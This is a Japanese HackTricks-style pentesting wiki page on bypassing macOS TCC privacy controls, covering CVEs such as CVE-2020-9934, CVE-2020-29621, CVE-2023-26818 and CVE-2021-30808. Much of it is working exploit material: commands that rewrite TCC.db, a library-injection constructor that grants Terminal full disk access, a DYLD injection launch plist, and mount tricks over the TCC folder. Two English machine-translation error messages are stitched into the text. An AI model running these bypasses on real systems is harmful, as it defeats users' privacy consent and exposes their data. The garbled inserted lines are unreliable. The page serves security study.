# macOS TCC バイパス

<details>

<summary><strong>AWSハッキングをゼロからヒーローまで学ぶには</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>をご覧ください！</strong></summary>

HackTricksをサポートする他の方法:

* **HackTricksにあなたの会社を広告掲載したい場合**や**HackTricksをPDFでダウンロードしたい場合**は、[**サブスクリプションプラン**](https://github.com/sponsors/carlospolop)をチェックしてください！
* [**公式PEASS & HackTricksグッズ**](https://peass.creator-spring.com)を入手する
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)を発見し、独占的な[**NFTs**](https://opensea.io/collection/the-peass-family)コレクションをチェックする
* 💬 [**Discordグループ**](https://discord.gg/hRep4RUj7f)や[**テレグラムグループ**](https://t.me/peass)に**参加する**か、**Twitter** 🐦 [**@carlospolopm**](https://twitter.com/carlospolopm)を**フォローする**。
* [**HackTricks**](https://github.com/carlospolop/hacktricks)と[**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud)のgithubリポジトリにPRを提出して、あなたのハッキングテクニックを**共有する**。

</details>

## 機能別

### 書き込みバイパス

これはバイパスではありません。これはTCCがどのように機能するかの一例です：**書き込みから保護されていません**。もしTerminalがユーザーのデスクトップの読み取りアクセスを持っていなくても、デスクトップに対して書き込むことはできます：
```shell-session
username@hostname ~ % ls Desktop
ls: Desktop: Operation not permitted
username@hostname ~ % echo asd > Desktop/lalala
username@hostname ~ % ls Desktop
ls: Desktop: Operation not permitted
username@hostname ~ % cat Desktop/lalala
asd
```
**`com.apple.macl` 拡張属性**は、新しい**ファイル**に追加され、**作成者のアプリ**がそれを読むためのアクセスを許可します。

### SSH バイパス

デフォルトでは、**SSH 経由のアクセスは「フルディスクアクセス」を持っていました**。これを無効にするには、リストに記載されているが無効化されている必要があります（リストから削除しても権限は削除されません）：

![](<../../../../../.gitbook/assets/image (569).png>)

ここでは、いくつかの**マルウェアがこの保護をバイパスする方法の例**を見つけることができます：

* [https://www.jamf.com/blog/zero-day-tcc-bypass-discovered-in-xcsset-malware/](https://www.jamf.com/blog/zero-day-tcc-bypass-discovered-in-xcsset-malware/)

{% hint style="danger" %}
SSHを有効にするためには、現在**フルディスクアクセス**が必要であることに注意してください。
{% endhint %}

### 拡張子の処理 - CVE-2022-26767

属性**`com.apple.macl`**は、**特定のアプリケーションがそれを読むための権限を与えるために**ファイルに与えられます。この属性は、アプリの上にファイルを**ドラッグ＆ドロップ**したとき、またはユーザーがファイルを**ダブルクリック**して**デフォルトのアプリケーション**で開いたときに設定されます。

したがって、ユーザーは**悪意のあるアプリ**を登録してすべての拡張子を処理し、Launch Servicesを呼び出して任意のファイルを**開く**ことができます（そのため、悪意のあるファイルにはそれを読むためのアクセスが許可されます）。

### iCloud

権限**`com.apple.private.icloud-account-access`**を使用すると、**`com.apple.iCloudHelper`** XPCサービスと通信し、**iCloudトークンを提供**することができます。

**iMovie**と**Garageband**はこの権限を持っていました。

その権限から**iCloudトークンを取得する**ためのエクスプロイトについての詳細は、トーク：[**#OBTS v5.0: "What Happens on your Mac, Stays on Apple's iCloud?!" - Wojciech Regula**](https://www.youtube.com/watch?v=\_6e2LhmxVc0)をチェックしてください。

### kTCCServiceAppleEvents / Automation

**`kTCCServiceAppleEvents`** 権限を持つアプリは、**他のアプリを制御**することができます。これは、他のアプリに付与された権限を**悪用**することができることを意味します。

Apple Scriptsについての詳細は以下をチェックしてください：

{% content-ref url="macos-apple-scripts.md" %}
[macos-apple-scripts.md](macos-apple-scripts.md)
{% endcontent-ref %}

例えば、アプリが**`iTerm`に対するAutomation権限を持っている場合**、この例では**`Terminal`**がiTermにアクセス権を持っています：

<figure><img src="../../../../../.gitbook/assets/image (2) (2) (1).png" alt=""><figcaption></figcaption></figure>

#### iTermに対して

FDAを持っていないTerminalは、それを持っているiTermを呼び出し、アクションを実行するために使用することができます：

{% code title="iterm.script" %}
```applescript
tell application "iTerm"
activate
tell current window
create tab with default profile
end tell
tell current session of current window
write text "cp ~/Desktop/private.txt /tmp"
end tell
end tell
```
Since the provided text does not contain any English content to translate, there is nothing to translate into Japanese. The text appears to be a closing tag for a code block in markdown syntax. If you provide English content from the hacking book, I can then translate it into Japanese for you.
```bash
osascript iterm.script
```
#### Finder 経由

Finder へのアクセス権を持つアプリであれば、以下のようなスクリプトを使用することができます：
```applescript
set a_user to do shell script "logname"
tell application "Finder"
set desc to path to home folder
set copyFile to duplicate (item "private.txt" of folder "Desktop" of folder a_user of item "Users" of disk of home) to folder desc with replacing
set t to paragraphs of (do shell script "cat " & POSIX path of (copyFile as alias)) as text
end tell
do shell script "rm " & POSIX path of (copyFile as alias)
```
## アプリの振る舞いによるもの

### CVE-2020–9934 - TCC <a href="#c19b" id="c19b"></a>

ユーザーランドの**tccdデーモン**は、**`HOME`** **環境変数**を使用して、以下のTCCユーザーデータベースにアクセスしていました: **`$HOME/Library/Application Support/com.apple.TCC/TCC.db`**

[このStack Exchangeの投稿](https://stackoverflow.com/questions/135688/setting-environment-variables-on-os-x/3756686#3756686)によると、TCCデーモンは`launchd`を介して現在のユーザーのドメイン内で実行されているため、それに渡される**すべての環境変数を制御することが可能**です。\
したがって、**攻撃者は`launchctl`内で`$HOME`環境変数を制御されたディレクトリを指すように設定し**、**TCCデーモンを再起動**し、その後**直接TCCデータベースを変更して**、エンドユーザーに通知することなく**利用可能なすべてのTCCエンタイトルメントを自分自身に付与することができます**。\
PoC:
```bash
# reset database just in case (no cheating!)
$> tccutil reset All
# mimic TCC's directory structure from ~/Library
$> mkdir -p "/tmp/tccbypass/Library/Application Support/com.apple.TCC"
# cd into the new directory
$> cd "/tmp/tccbypass/Library/Application Support/com.apple.TCC/"
# set launchd $HOME to this temporary directory
$> launchctl setenv HOME /tmp/tccbypass
# restart the TCC daemon
$> launchctl stop com.apple.tccd && launchctl start com.apple.tccd
# print out contents of TCC database and then give Terminal access to Documents
$> sqlite3 TCC.db .dump
$> sqlite3 TCC.db "INSERT INTO access
VALUES('kTCCServiceSystemPolicyDocumentsFolder',
'com.apple.Terminal', 0, 1, 1,
X'fade0c000000003000000001000000060000000200000012636f6d2e6170706c652e5465726d696e616c000000000003',
NULL,
NULL,
'UNUSED',
NULL,
NULL,
1333333333333337);"
# list Documents directory without prompting the end user
$> ls ~/Documents
```
### CVE-2021-30761 - Notes

NotesはTCCで保護された場所にアクセスできましたが、ノートが作成されるとき、これは**保護されていない場所に作成されます**。したがって、保護されたファイルをノートにコピーするようにNotesに依頼し（つまり保護されていない場所に）、その後ファイルにアクセスすることができました：

<figure><img src="../../../../../.gitbook/assets/image (6) (1) (3).png" alt=""><figcaption></figcaption></figure>

### CVE-2021-30782 - Translocation

バイナリ`/usr/libexec/lsd`とライブラリ`libsecurity_translocate`は、**nullfs**マウントを作成することを許可する`com.apple.private.nullfs_allow`の権限を持ち、**`kTCCServiceSystemPolicyAllFiles`**を使用してすべてのファイルにアクセスする`com.apple.private.tcc.allow`の権限を持っていました。

"Library"に検疫属性を追加し、**`com.apple.security.translocation`** XPCサービスを呼び出すと、Libraryが**`$TMPDIR/AppTranslocation/d/d/Library`**にマップされ、Library内のすべてのドキュメントに**アクセス**することができました。

### CVE-2023-38571 - Music & TV <a href="#cve-2023-38571-a-macos-tcc-bypass-in-music-and-tv" id="cve-2023-38571-a-macos-tcc-bypass-in-music-and-tv"></a>

**`Music`**には興味深い機能があります：実行中に、**`~/Music/Music/Media.localized/Automatically Add to Music.localized`**にドロップされたファイルをユーザーの"メディアライブラリ"に**インポート**します。さらに、次のようなことを呼び出します：**`rename(a, b);`** ここで`a`と`b`は：

* `a = "~/Music/Music/Media.localized/Automatically Add to Music.localized/myfile.mp3"`
* `b = "~/Music/Music/Media.localized/Automatically Add to Music.localized/Not Added.localized/2023-09-25 11.06.28/myfile.mp3"`

この**`rename(a, b);`**の動作は**レースコンディション**に弱いです。なぜなら、`Automatically Add to Music.localized`フォルダに偽の**TCC.db**ファイルを置き、新しいフォルダ(b)がファイルをコピーするために作成されたときに、それを削除し、**`~/Library/Application Support/com.apple.TCC`**/にリンクすることが可能だからです。

### SQLITE_SQLLOG_DIR - CVE-2023-32422

**`SQLITE_SQLLOG_DIR="path/folder"`**が基本的に意味するのは、**開かれたdbがそのパスにコピーされる**ということです。このCVEでは、この制御が悪用され、FDAを持つプロセスによって**開かれるTCCデータベース**内で**書き込み**を行う**SQLiteデータベース**に悪用されました。そして、**`SQLITE_SQLLOG_DIR`**を**ファイル名のシンボリックリンク**とともに悪用することで、そのデータベースが**開かれる**ときに、ユーザーの**TCC.dbが開かれたもので上書きされます**。\
**詳細情報**は[**ライトアップで**](https://gergelykalman.com/sqlol-CVE-2023-32422-a-macos-tcc-bypass.html)、[**トークで**](https://www.youtube.com/watch?v=f1HA5QhLQ7Y\&t=20548s)。

### **SQLITE_AUTO_TRACE**

環境変数**`SQLITE_AUTO_TRACE`**が設定されている場合、ライブラリ**`libsqlite3.dylib`**はすべてのSQLクエリの**ログ記録**を開始します。多くのアプリケーションがこのライブラリを使用していたため、それらのSQLiteクエリをすべてログに記録することが可能でした。

いくつかのAppleアプリケーションがこのライブラリを使用してTCCで保護された情報にアクセスしていました。
```bash
# Set this env variable everywhere
launchctl setenv SQLITE_AUTO_TRACE 1
```
### MTL\_DUMP\_PIPELINES\_TO\_JSON\_FILE - CVE-2023-32407

この**環境変数は `Metal` フレームワークによって使用されます**。これは様々なプログラムに依存しており、特にFDAを持つ `Music` が注目されます。

以下を設定します：`MTL_DUMP_PIPELINES_TO_JSON_FILE="path/name"`。`path` が有効なディレクトリであれば、バグがトリガーされ、`fs_usage` を使用してプログラム内で何が起こっているかを確認できます：

* `path/.dat.nosyncXXXX.XXXXXX`（Xはランダム）と呼ばれるファイルが `open()` されます。
* 一つ以上の `write()` がファイルに内容を書き込みます（これはコントロールできません）。
* `path/.dat.nosyncXXXX.XXXXXX` が `path/name` に `renamed()` されます。

これは一時的なファイル書き込みであり、**`rename(old, new)`** **は安全ではありません。**

安全でない理由は、**古いパスと新しいパスを別々に解決する必要がある**ためで、これには時間がかかることがあり、Race Conditionに対して脆弱になる可能性があります。詳細については、`xnu` 関数 `renameat_internal()` を確認してください。

{% hint style="danger" %}
基本的に、特権プロセスがあなたがコントロールするフォルダから名前を変更している場合、RCEを獲得して異なるファイルにアクセスさせるか、このCVEのように、特権アプリが作成したファイルを開いてFDを保存することができます。

名前変更があなたがコントロールするフォルダにアクセスする場合、ソースファイルを変更したり、それにFDを持っている間に、目的のファイル（またはフォルダ）をシンボリックリンクに変更することで、いつでも書き込むことができます。
{% endhint %}

これがCVEでの攻撃でした：例えば、ユーザーの `TCC.db` を上書きするために、以下の手順を踏むことができます：

* `/Users/hacker/ourlink` を `/Users/hacker/Library/Application Support/com.apple.TCC/` にリンクさせます。
* ディレクトリ `/Users/hacker/tmp/` を作成します。
* `MTL_DUMP_PIPELINES_TO_JSON_FILE=/Users/hacker/tmp/TCC.db` を設定します。
* この環境変数を使用して `Music` を実行し、バグをトリガーします。
* `/Users/hacker/tmp/.dat.nosyncXXXX.XXXXXX`（Xはランダム）の `open()` をキャッチします。
* ここで、このファイルを書き込み用に `open()` し、ファイルディスクリプタを保持します。
* `/Users/hacker/tmp` と `/Users/hacker/ourlink` を **ループ内で原子的に切り替えます**。
* レースのウィンドウは非常に短いため、成功の可能性を最大限に高めるためにこれを行いますが、レースに負けてもデメリットはほとんどありません。
* 少し待ちます。
* 運が良かったかどうかをテストします。
* だめなら、最初からやり直します。

詳細は [https://gergelykalman.com/lateralus-CVE-2023-32407-a-macos-tcc-bypass.html](https://gergelykalman.com/lateralus-CVE-2023-32407-a-macos-tcc-bypass.html) をご覧ください。

{% hint style="danger" %}
現在、環境変数 `MTL_DUMP_PIPELINES_TO_JSON_FILE` を使用しようとするとアプリは起動しません。
{% endhint %}

### Apple Remote Desktop

rootとしてこのサービスを有効にすると、**ARDエージェントはフルディスクアクセスを持つ**ことになり、ユーザーが新しい **TCCユーザーデータベース** をコピーするように悪用することができます。

## **NFSHomeDirectory** による

TCCはユーザーのHOMEフォルダ内のデータベースを使用して、ユーザーに固有のリソースへのアクセスを制御します。**$HOME/Library/Application Support/com.apple.TCC/TCC.db**。\
したがって、ユーザーが $HOME 環境変数を **異なるフォルダ** に指すようにしてTCCを再起動することができれば、**/Library/Application Support/com.apple.TCC/TCC.db** に新しいTCCデータベースを作成し、任意のアプリに任意のTCC権限を付与するようにTCCを騙すことができます。

{% hint style="success" %}
Appleはユーザープロファイル内に保存されている設定を **`NFSHomeDirectory`** 属性の **`$HOME` の値** として使用するので、この値を変更する権限を持つアプリケーションを侵害することができれば（**`kTCCServiceSystemPolicySysAdminFiles`**）、このオプションをTCCバイパスとして **武器化** することができます。
{% endhint %}

### [CVE-2020–9934 - TCC](./#c19b) <a href="#c19b" id="c19b"></a>

### [CVE-2020-27937 - Directory Utility](./#cve-2020-27937-directory-utility-1)

### CVE-2021-30970 - Powerdir

**最初のPOC** は [**dsexport**](https://www.unix.com/man-page/osx/1/dsexport/) と [**dsimport**](https://www.unix.com/man-page/osx/1/dsimport/) を使用して、ユーザーの **HOME** フォルダを変更します。

1. 対象アプリの _csreq_ ブロブを取得します。
2. 必要なアクセスと _csreq_ ブロブを含む偽の _TCC.db_ ファイルを設置します。
3. [**dsexport**](https://www.unix.com/man-page/osx/1/dsexport/) を使用してユーザーのディレクトリサービスエントリをエクスポートします。
4. ユーザーのホームディレクトリを変更するためにディレクトリサービスエントリを変更します。
5. [**dsimport**](https://www.unix.com/man-page/osx/1/dsimport/) を使用して変更されたディレクトリサービスエントリをインポートします。
6. ユーザーの _tccd_ を停止し、プロセスを再起動します。

二番目のPOCは **`/usr/libexec/configd`** を使用し、`com.apple.private.tcc.allow` という値 `kTCCServiceSystemPolicySysAdminFiles` を持っていました。\
**`configd`** を **`-t`** オプションで実行することが可能で、攻撃者は **カスタムバンドルをロードする** を指定できました。したがって、このエクスプロイトは、ユーザーのホームディレクトリを変更する **`dsexport`** と **`dsimport`** の方法を **`configd` コードインジェクション** に置き換えます。

詳細は [**元のレポート**](https://www.microsoft.com/en-us/security/blog/2022/01/10/new-macos-vulnerability-powerdir-could-lead-to-unauthorized-user-data-access/) を確認してください。

## プロセスインジェクションによる

TCC権限を悪用するためにプロセス内にコードをインジェクトするさまざまな技術があります：

{% content-ref url="../../../macos-proces-abuse/" %}
[macos-proces-abuse](../../../macos-proces-abuse/)
{% endcontent-ref %}

さらに、TCCをバイパスするために見つかった最も一般的なプロセスインジェクションは **プラグイン（ライブラリのロード）** 経由です。\
プラグインは通常、ライブラリやplistの形で追加コードであり、**メインアプリケーションによってロードされ**、そのコンテキストで実行されます。したがって、メインアプリケーションがTCC制限ファイルへのアクセスを持っている場合（許可された権限やエンタイトルメントを介して）、**カスタムコードもそれを持つことになります**。

### CVE-2020-27937 - Directory Utility

アプリケーション `/System/Library/CoreServices/Applications/Directory Utility.app` はエンタイトルメント **`kTCCServiceSystemPolicySysAdminFiles`** を持ち、**`.daplug`** 拡張子のプラグインをロードし、ハード化されたランタイムを持っていませんでした。

このCVEを武器化するために、**`NFSHomeDirectory`** が **変更されます**（前述のエンタイトルメントを悪用して）、ユーザーのTCCデータベースを乗っ取り、TCCをバイパスすることができます。

詳細は [**元のレポート**](https://wojciechregula.blog/post/change-home-directory-and-bypass-tcc-aka-cve-2020-27937/) を確認してください。

### CVE-2020-29621 - Coreaudiod

バイナリ **`/usr/sbin/coreaudiod`** はエンタイトルメント `com.apple.security.cs.disable-library-validation` と `com.apple.private.tcc.manager` を持っていました。最初のものは **コードインジェクションを許可し**、二番目のものは **TCCを管理する** アクセスを与えます。

このバイナリは `/Library/Audio/Plug-Ins/HAL` フォルダから **サードパーティのプラグインをロード** することができました。したがって、プラグインをロードして **TCC権限を悪用する** ことがこのPoCで可能でした：
```objectivec
#import <Foundation/Foundation.h>
#import <Security/Security.h>

extern void TCCAccessSetForBundleIdAndCodeRequirement(CFStringRef TCCAccessCheckType, CFStringRef bundleID, CFDataRef requirement, CFBooleanRef giveAccess);

void add_tcc_entry() {
CFStringRef TCCAccessCheckType = CFSTR("kTCCServiceSystemPolicyAllFiles");

CFStringRef bundleID = CFSTR("com.apple.Terminal");
CFStringRef pureReq = CFSTR("identifier \"com.apple.Terminal\" and anchor apple");
SecRequirementRef requirement = NULL;
SecRequirementCreateWithString(pureReq, kSecCSDefaultFlags, &requirement);
CFDataRef requirementData = NULL;
SecRequirementCopyData(requirement, kSecCSDefaultFlags, &requirementData);

TCCAccessSetForBundleIdAndCodeRequirement(TCCAccessCheckType, bundleID, requirementData, kCFBooleanTrue);
}

__attribute__((constructor)) static void constructor(int argc, const char **argv) {

add_tcc_entry();

NSLog(@"[+] Exploitation finished...");
exit(0);
```
詳細については、[**オリジナルのレポート**](https://wojciechregula.blog/post/play-the-music-and-bypass-tcc-aka-cve-2020-29621/)をご覧ください。

### Device Abstraction Layer (DAL) プラグイン

Core Media I/O を介してカメラストリームを開くシステムアプリケーション（**`kTCCServiceCamera`** を持つアプリ）は、プロセス内で `/Library/CoreMediaIO/Plug-Ins/DAL` に位置するこれらのプラグインを**読み込みます**（SIP制限なし）。

共通の**コンストラクタ**を持つライブラリをそこに保存するだけで、**コードを注入**することができます。

いくつかのAppleアプリケーションがこの脆弱性にさらされていました。

### Firefox

Firefoxアプリケーションは `com.apple.security.cs.disable-library-validation` と `com.apple.security.cs.allow-dyld-environment-variables` の権限を持っていました：
```xml
codesign -d --entitlements :- /Applications/Firefox.app
Executable=/Applications/Firefox.app/Contents/MacOS/firefox

<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "https://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>com.apple.security.cs.allow-unsigned-executable-memory</key>
<true/>
<key>com.apple.security.cs.disable-library-validation</key>
<true/>
<key>com.apple.security.cs.allow-dyld-environment-variables</key><true/>
<true/>
<key>com.apple.security.device.audio-input</key>
<true/>
<key>com.apple.security.device.camera</key>
<true/>
<key>com.apple.security.personal-information.location</key>
<true/>
<key>com.apple.security.smartcard</key>
<true/>
</dict>
</plist>
```
詳細については、[**元のレポートを確認してください**](https://wojciechregula.blog/post/how-to-rob-a-firefox/)。

### CVE-2020-10006

バイナリ `/system/Library/Filesystems/acfs.fs/Contents/bin/xsanctl` は、権限 **`com.apple.private.tcc.allow`** と **`com.apple.security.get-task-allow`** を持っており、プロセス内にコードを注入し、TCCの権限を使用することができました。

### CVE-2023-26818 - Telegram

Telegramは、権限 **`com.apple.security.cs.allow-dyld-environment-variables`** と **`com.apple.security.cs.disable-library-validation`** を持っていたため、カメラでの録画などの**権限へのアクセスを得る**ために悪用することが可能でした。[**ペイロードはライトアップで見つけることができます**](https://danrevah.github.io/2023/05/15/CVE-2023-26818-Bypass-TCC-with-Telegram/)。

環境変数を使用してライブラリをロードする方法に注意してください。**カスタムplist**が作成され、このライブラリを注入し、**`launchctl`** を使用して起動しました：
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>Label</key>
<string>com.telegram.launcher</string>
<key>RunAtLoad</key>
<true/>
<key>EnvironmentVariables</key>
<dict>
<key>DYLD_INSERT_LIBRARIES</key>
<string>/tmp/telegram.dylib</string>
</dict>
<key>ProgramArguments</key>
<array>
<string>/Applications/Telegram.app/Contents/MacOS/Telegram</string>
</array>
<key>StandardOutPath</key>
<string>/tmp/telegram.log</string>
<key>StandardErrorPath</key>
<string>/tmp/telegram.log</string>
</dict>
</plist>
```

```bash
launchctl load com.telegram.launcher.plist
```
## openコマンドによる呼び出し

サンドボックス内でも**`open`**を呼び出すことが可能です。

### ターミナルスクリプト

技術者が使用するコンピュータでは、ターミナルに**フルディスクアクセス(FDA)**を与えることがよくあります。そして、それを使って**`.terminal`**スクリプトを呼び出すことができます。

**`.terminal`**スクリプトは、以下のようなplistファイルで、実行するコマンドは**`CommandString`**キーに記述されています：
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd"> <plist version="1.0">
<dict>
<key>CommandString</key>
<string>cp ~/Desktop/private.txt /tmp/;</string>
<key>ProfileCurrentVersion</key>
<real>2.0600000000000001</real>
<key>RunCommandAsShell</key>
<false/>
<key>name</key>
<string>exploit</string>
<key>type</key>
<string>Window Settings</string>
</dict>
</plist>
```
アプリケーションは、/tmp のような場所にターミナルスクリプトを書き込み、次のようなコマンドで起動することができます:
```objectivec
// Write plist in /tmp/tcc.terminal
[...]
NSTask *task = [[NSTask alloc] init];
NSString * exploit_location = @"/tmp/tcc.terminal";
task.launchPath = @"/usr/bin/open";
task.arguments = @[@"-a", @"/System/Applications/Utilities/Terminal.app",
exploit_location]; task.standardOutput = pipe;
[task launch];
```
## マウントによる方法

### CVE-2020-9771 - mount\_apfs TCCバイパスおよび権限昇格

**任意のユーザー**（権限のないユーザーも含む）は、タイムマシンのスナップショットを作成してマウントし、そのスナップショットの**すべてのファイルにアクセス**することができます。
**必要な権限**は、使用されるアプリケーション（例えば`Terminal`）が**フルディスクアクセス**（FDA）権限（`kTCCServiceSystemPolicyAllfiles`）を持っていることで、これは管理者によって付与される必要があります。

{% code overflow="wrap" %}
```bash
# Create snapshot
tmutil localsnapshot

# List snapshots
tmutil listlocalsnapshots /
Snapshots for disk /:
com.apple.TimeMachine.2023-05-29-001751.local

# Generate folder to mount it
cd /tmp # I didn it from this folder
mkdir /tmp/snap

# Mount it, "noowners" will mount the folder so the current user can access everything
/sbin/mount_apfs -o noowners -s com.apple.TimeMachine.2023-05-29-001751.local /System/Volumes/Data /tmp/snap

# Access it
ls /tmp/snap/Users/admin_user # This will work
```
{% endcode %}

より詳細な説明は[**元のレポートで見ることができます**](https://theevilbit.github.io/posts/cve\_2020\_9771/)**。**

### CVE-2021-1784 & CVE-2021-30808 - TCCファイル上にマウント

TCC DBファイルが保護されていても、新しいTCC.dbファイルを**ディレクトリ上にマウントする**ことが可能でした：

{% code overflow="wrap" %}
```bash
# CVE-2021-1784
## Mount over Library/Application\ Support/com.apple.TCC
hdiutil attach -owners off -mountpoint Library/Application\ Support/com.apple.TCC test.dmg

# CVE-2021-1784
## Mount over ~/Library
hdiutil attach -readonly -owners off -mountpoint ~/Library /tmp/tmp.dmg
```
Since the provided text does not contain any content to translate, I cannot provide a translation. If you provide the relevant English text that needs to be translated into Japanese, I will be able to assist you.
```python
# This was the python function to create the dmg
def create_dmg():
os.system("hdiutil create /tmp/tmp.dmg -size 2m -ov -volname \"tccbypass\" -fs APFS 1>/dev/null")
os.system("mkdir /tmp/mnt")
os.system("hdiutil attach -owners off -mountpoint /tmp/mnt /tmp/tmp.dmg 1>/dev/null")
os.system("mkdir -p /tmp/mnt/Application\ Support/com.apple.TCC/")
os.system("cp /tmp/TCC.db /tmp/mnt/Application\ Support/com.apple.TCC/TCC.db")
os.system("hdiutil detach /tmp/mnt 1>/dev/null")
```
**完全なエクスプロイト**は[**オリジナルのライトアップ**](https://theevilbit.github.io/posts/cve-2021-30808/)で確認してください。

### asr

ツール **`/usr/sbin/asr`** はディスク全体をコピーして、TCC保護をバイパスしながら別の場所にマウントすることができました。

### 位置情報サービス

**`/var/db/locationd/clients.plist`** には、**位置情報サービスにアクセス**を許可されたクライアントを示す第三のTCCデータベースがあります。\
**`/var/db/locationd/` フォルダはDMGマウントから保護されていなかった**ので、独自のplistをマウントすることが可能でした。

## スタートアップアプリによる

{% content-ref url="../../../../macos-auto-start-locations.md" %}
[macos-auto-start-locations.md](../../../../macos-auto-start-locations.md)
{% endcontent-ref %}

## grepによる

複数の場合、ファイルはメールアドレス、電話番号、メッセージなどの機密情報を保護されていない場所に保存します（これはAppleの脆弱性と見なされます）。

<figure><img src="../../../../../.gitbook/assets/image (4) (3).png" alt=""><figcaption></figcaption></figure>

## 合成クリック

これはもう機能しませんが、[**過去には機能しました**](https://twitter.com/noarfromspace/status/639125916233416704/photo/1)**:**

<figure><img src="../../../../../.gitbook/assets/image (2) (1).png" alt=""><figcaption></figcaption></figure>

[**CoreGraphicsイベント**](https://objectivebythesea.org/v2/talks/OBTS\_v2\_Wardle.pdf)を使用した別の方法:

<figure><img src="../../../../../.gitbook/assets/image (1) (1) (1) (1).png" alt="" width="563"><figcaption></figcaption></figure>

## 参考文献

* [**https://medium.com/@mattshockl/cve-2020-9934-bypassing-the-os-x-transparency-consent-and-control-tcc-framework-for-4e14806f1de8**](https://medium.com/@mattshockl/cve-2020-9934-bypassing-the-os-x-transparency-consent-and-control-tcc-framework-for-4e14806f1de8)
* [**https://www.sentinelone.com/labs/bypassing-macos-tcc-user-privacy-protections-by-accident-and-design/**](https://www.sentinelone.com/labs/bypassing-macos-tcc-user-privacy-protections-by-accident-and-design/)
* [**macOSのプライバシーメカニズムをバイパスする20以上の方法**](https://www.youtube.com/watch?v=W9GxnP8c8FU)
* [**TCCに対するノックアウト勝利 - macOSのプライバシーメカニズムをバイパスする20以上の新しい方法**](https://www.youtube.com/watch?v=a9hsxPdRxsY)

<details>

<summary><strong>htARTE (HackTricks AWS Red Team Expert)で</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>AWSハッキングをゼロからヒーローまで学ぶ</strong></a><strong>!</strong></summary>

HackTricksをサポートする他の方法:

* **HackTricksにあなたの会社を広告したい**、または**HackTricksをPDFでダウンロードしたい**場合は、[**サブスクリプションプラン**](https://github.com/sponsors/carlospolop)をチェックしてください！
* [**公式PEASS & HackTricksグッズ**](https://peass.creator-spring.com)を入手する
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)を発見する、私たちの独占的な[**NFTs**](https://opensea.io/collection/the-peass-family)のコレクション
* 💬 [**Discordグループ**](https://discord.gg/hRep4RUj7f)や[**テレグラムグループ**](https://t.me/peass)に**参加する**、または**Twitter** 🐦 [**@carlospolopm**](https://twitter.com/carlospolopm)で**フォローする**。
* [**HackTricks**](https://github.com/carlospolop/hacktricks)と[**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud)のgithubリポジトリにPRを提出して、あなたのハッキングのコツを**共有する**。

</details>
